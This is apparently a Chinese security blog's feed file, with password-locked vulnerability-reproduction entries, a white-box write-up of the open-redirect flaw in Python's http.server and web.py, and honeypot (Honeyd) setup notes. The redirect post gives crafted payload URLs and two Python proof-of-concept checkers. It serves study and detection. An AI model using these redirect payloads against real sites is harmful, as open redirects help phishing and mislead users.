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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Serv-U 15.1.6</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-1003000 Jenkins-PreAuth-RCE复现</title>
    <url>/2019/07/28/CVE-2019-1003000-Jenkins-PreAuth-RCE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>URL跳转漏洞白盒实践</title>
    <url>/2018/11/21/URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E7%99%BD%E7%9B%92%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="python-http-server-web-py-URL跳转漏洞实践"><a href="#python-http-server-web-py-URL跳转漏洞实践" class="headerlink" title="python: http.server / web.py URL跳转漏洞实践"></a>python: http.server / web.py URL跳转漏洞实践</h2><blockquote>
<p>前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。</p>
</blockquote>
<h3 id="HTTP-SERVER"><a href="#HTTP-SERVER" class="headerlink" title="HTTP.SERVER"></a>HTTP.SERVER</h3><ul>
<li><p>python一键启动web服务器 <code>python -m http.server</code></p>
<p>在任意目录执行上面的命令，可以启动一个web服务端，模拟一个服务器。这里用到了http.server这个模块</p>
</li>
<li><p>http.server模块下包含几个类</p>
<ul>
<li><code>HTTPServer</code>这个类继承于<code>socketserver.TCPServer</code>，说明其实HTTP服务器本质是一个TCP服务器</li>
<li><code>BaseHTTPRequestHandler</code>，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作</li>
<li><code>SimpleHTTPRequestHandler</code>，这个类继承于<code>BaseHTTPRequestHandler</code>，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。</li>
<li><code>CGIHTTPRequestHandler</code>，这个类继承于<code>SimpleHTTPRequestHandler</code>，在静态文件服务器的基础上，增加了执行CGI脚本的功能。</li>
</ul>
</li>
<li><p>http.server的几个类的关系就是下面这样（P牛的图）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png" alt></p>
</li>
<li><p>通过分析：SimpleHTTPRequestHandler是将用户请求的path返回给用户的，并且它继承了BaseHTTPRequestHandler类的HTTP协议解析的特性，并返回数据包，所以说明http.server这个发生URL跳转会发生在SimpleHTTPRequestHandler的代码中</p>
</li>
<li><p>分析SimpleHTTPRequestHandler类源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleHTTPRequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    server_version = <span class="string">"SimpleHTTP/"</span> + __version__</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#如果是GET请求就调用do_GET函数，在do_GET中调用了send_head函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Serve a GET request."""</span></span><br><span class="line">        f = self.send_head()</span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.copyfile(f, self.wfile)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_head</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#translate_path函数解析用户输入的请求path，判断用户真正请求的文件</span></span><br><span class="line">        path = self.translate_path(self.path)</span><br><span class="line">        f = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#判断用户的请求的文件或目录是否在web服务器的目录中，如果在则进入第一个if语  		 句，如果请求的路径不存在则跳转到web服务的主页</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">            <span class="comment">#将用户输入的请求解析过后用rllib.parse.urlsplit拆分，用于后面的判断</span></span><br><span class="line">            parts = urllib.parse.urlsplit(self.path)</span><br><span class="line">            <span class="comment">#判断用户请求的地址是否以'/'结尾，如果是则直接返回相应请求内容，如果不是			 则进入第二个if语句，将用户的请求加上'/'后进行跳转，也是漏洞点</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> parts.path.endswith(<span class="string">'/'</span>):</span><br><span class="line">                <span class="comment"># redirect browser - doing basically what apache does</span></span><br><span class="line">                self.send_response(HTTPStatus.MOVED_PERMANENTLY)</span><br><span class="line">                new_parts = (parts[<span class="number">0</span>], parts[<span class="number">1</span>], parts[<span class="number">2</span>] + <span class="string">'/'</span>,</span><br><span class="line">                             parts[<span class="number">3</span>], parts[<span class="number">4</span>])</span><br><span class="line">                new_url = urllib.parse.urlunsplit(new_parts)</span><br><span class="line">                self.send_header(<span class="string">"Location"</span>, new_url)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            <span class="keyword">for</span> index <span class="keyword">in</span> <span class="string">"index.html"</span>, <span class="string">"index.htm"</span>:</span><br><span class="line">                index = os.path.join(path, index)</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(index):</span><br><span class="line">                    path = index</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> self.list_directory(path)</span><br><span class="line">        <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>找到漏洞点在 if not parts.path.endswith(‘/‘)后进一步分析：</p>
<ul>
<li>这里的代码逻辑是判断用户请求的一个已经存在的文件是不是以 ‘/’结尾的，如果不是，则加上‘/’进行301跳转。</li>
<li>现在主流的浏览器访问 <code>//baidu.com</code> 时候会跳转到 <code>baidu.com</code> 会默认认为这个URL是当前数据包的协议，也就是说，这里要跳转，必须要构造成跳转时能解析为一个正常的域名，必须构造成 <code>127.0.0.1:8000//baidu.com</code></li>
<li>常见的URL跳转应该是<code>127.0.0.1:8000/baidu.com</code>一个斜杠，这里为什么要两个呢；原因在parts = urllib.parse.urlsplit(self.path)这里的分割，可以看到使用双斜杠后将用户的请求解析成一个netlocation,这里就会发生跳转，产生URL跳转漏洞。<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799015.32.png" alt></li>
</ul>
</li>
<li><p>现在触发点找到了，还有一个问题，就是初始值的判断，http.server会判断用户访问的资源站内是否存在，绕过这个限制可以让请求跳到下一级目录 <code>/..</code></p>
</li>
<li><p>构造payload：<code>127.0.0.1:8000//baidu.com//..</code>(请求后没有跳转到百度，而是跳转到首页，抓包分析)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799795.42.png" alt></p>
<p>在浏览器直接请求127.0.0.1:8000//baidu.com//..根本不会将/..传到服务器，所以服务器收到的请求是 <code>127.0.0.1:8000//baidu.com/</code> 然后判断站点中不存在用户请求的资源</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799619.52.png" alt></p>
</li>
<li><p>要让服务端收到的请求中包跳目录的请求，必须进行URL编码：(成功跳转，已经证明漏洞存在，这里的绕过跨目录没法控制，不能调到baidu主页，但是学习思路，证明漏洞存在已经达到目标了)</p>
<p><code>127.0.0.1:8000//baidu.com/%2f..</code>  或 <code>127.0.0.1:8000//baidu.com/%2f%2e%2e</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800155.96.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800189.28.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807039.02.png" alt></p>
</li>
</ul>
<h3 id="web-py框架"><a href="#web-py框架" class="headerlink" title="web.py框架"></a>web.py框架</h3><p>继承并使用了<code>SimpleHTTPRequestHandler</code>类，web.py在处理静态文件的时候会使用SimpleHTTPRequestHandler`类，所以会受到影响</p>
<ul>
<li><p>简单的web.py代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/(.*)'</span>, <span class="string">'hello'</span></span><br><span class="line">)</span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">            name = <span class="string">'World'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello, '</span> + name + <span class="string">'!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542805858.68.png" alt></p>
</li>
<li><p>模拟真实的生产环境：（web.py的应用中必须是静态文件才有效，所以必须制定css,js,图片等，原原理都是一样的，这里的@代表后面的是域名）</p>
<p><code>http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f</code>  <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542806989.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807062.2.png" alt></p>
</li>
</ul>
<h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><ul>
<li><p>http.server——poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#urllib.parse.urlparse代替python2中的urlparse模块中的urlparse.urlparse()方法</span></span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;//example.com/%2f%2e%2e"</span>.format(target)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    poc(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542808635.89.png" alt></p>
</li>
<li><p>web.py——poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"you should provide a static resoure url, like js or css or picture!"</span>)</span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    <span class="comment">#将静态文件路径中的"/"转换为%2f</span></span><br><span class="line">    path_list = x.path.split(<span class="string">"/"</span>)</span><br><span class="line">    path_list.pop()</span><br><span class="line">    path_list.remove(<span class="string">""</span>)</span><br><span class="line">    path_list.append(<span class="string">""</span>)</span><br><span class="line">    path = <span class="string">"%2f"</span>.join(path_list)</span><br><span class="line">    <span class="comment"># print(path)</span></span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;////&#123;1&#125;@www.example.com/..%2f"</span>.format(target,path)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    <span class="comment"># poc(sys.argv[1])</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8080/static/css/'</span>)</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542809567.07.png" alt></p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过一次白盒的URL跳转漏洞实践可以更好的掌握其原理，对黑盒测试也有帮助；比如这里的绕过文件判断的限制“/..”，与黑盒中的一些畸形绕过的方式就类似，学海无涯。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html</a></p>
<p><a href="http://www.polaris-lab.com/index.php/tag/web-py/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/web-py/</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>URL跳转</tag>
        <tag>WEB安全</tag>
        <tag>python安全</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Honeyd搭建简易蜜罐</title>
    <url>/2018/11/20/%E5%88%A9%E7%94%A8Honeyd%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93%E8%9C%9C%E7%BD%90/</url>
    <content><![CDATA[<h2 id="一次实验课：利用honeyd搭建蜜罐"><a href="#一次实验课：利用honeyd搭建蜜罐" class="headerlink" title="一次实验课：利用honeyd搭建蜜罐"></a>一次实验课：利用honeyd搭建蜜罐</h2><h3 id="Honeyd相关依赖的安装"><a href="#Honeyd相关依赖的安装" class="headerlink" title="Honeyd相关依赖的安装"></a>Honeyd相关依赖的安装</h3><h4 id="安装g-gcc（对相关的一些依赖进行源码编译安装）"><a href="#安装g-gcc（对相关的一些依赖进行源码编译安装）" class="headerlink" title="安装g++ gcc（对相关的一些依赖进行源码编译安装）"></a>安装g++ gcc（对相关的一些依赖进行源码编译安装）</h4><p><code>sudo apt-get update &amp;&amp; sudo apt-get install g++ gcc</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542713989.95.png" alt></p>
<h4 id="安装Libevent-非同步事件通知的函数库"><a href="#安装Libevent-非同步事件通知的函数库" class="headerlink" title="安装Libevent(非同步事件通知的函数库)"></a>安装Libevent(非同步事件通知的函数库)</h4><p>通过使用libevent，开发人员可以设定某些事件发生时所执行的函数，可以代替以往程序所使用的循环检查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf libevent-1.4.14b-stable.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714140.4.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714266.65.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714342.43.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714411.04.png" alt></p>
<h4 id="安装Libdnet-提供跨平台的网络相关的API函数库"><a href="#安装Libdnet-提供跨平台的网络相关的API函数库" class="headerlink" title="安装Libdnet(提供跨平台的网络相关的API函数库)"></a>安装Libdnet(提供跨平台的网络相关的API函数库)</h4><p>包括了ARP缓存，路由表查询，IP包及物理帧的传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf libdnet-1.11.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714501.68.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714633.0.png" alt></p>
<h4 id="安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础"><a href="#安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础" class="headerlink" title="安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)"></a>安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf libpcap-1.7.3.tar.gz</span><br><span class="line">sudo tar -zxvf libpcap-1.5.3.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line">#在Ubuntu下缺少 flex  bison 手动安装</span><br><span class="line">sudo apt-get install flex</span><br><span class="line">sudo apt-get install bison</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716679.98.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716838.58.png" alt></p>
<h4 id="安装ARPD（运行在与Honeyd相同的系统上）"><a href="#安装ARPD（运行在与Honeyd相同的系统上）" class="headerlink" title="安装ARPD（运行在与Honeyd相同的系统上）"></a>安装ARPD（运行在与Honeyd相同的系统上）</h4><p>是honeyd众多协作工具中最重要的一个工具。ARPD工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中ARPD会对指定IP地址范围内未使用的IP用honedy的MAC地址做出arp应答。这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机。这样设计可以在内网中最大化的诱导蠕虫病毒，诱导攻击流。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf arpd-0.2.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">#报错：error：expected’)’ before string constant</span><br><span class="line">#解决：在arpd.c文件中添加#define __FUNCTION__</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717043.1.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717136.12.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717261.85.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717343.56.png" alt></p>
